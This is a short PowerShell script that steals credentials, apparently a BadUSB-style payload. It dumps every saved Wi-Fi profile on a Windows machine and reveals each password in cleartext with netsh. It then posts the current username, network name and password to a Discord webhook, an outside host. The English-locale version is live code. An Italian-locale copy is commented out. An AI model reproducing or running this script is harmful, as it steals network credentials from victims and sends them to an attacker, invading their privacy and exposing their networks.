
# ENG
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'

	$Body = @{
		'username' = $env:username + " | " + [string]$wlan
		'content' = [string]$passw
	}
	
	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
}

# ITA
# netsh wlan show profile | Select-String '(?<=Tutti i profili utente\s+:\s).+' | ForEach-Object {
#     $wlan  = $_.Matches.Value
#     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenuto chiave\s+:\s).+'

# 	$Body = @{
# 		'username' = $env:username + " | " + [string]$wlan
# 		'content' = [string]$passw
# 	}
	
# 	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
# }
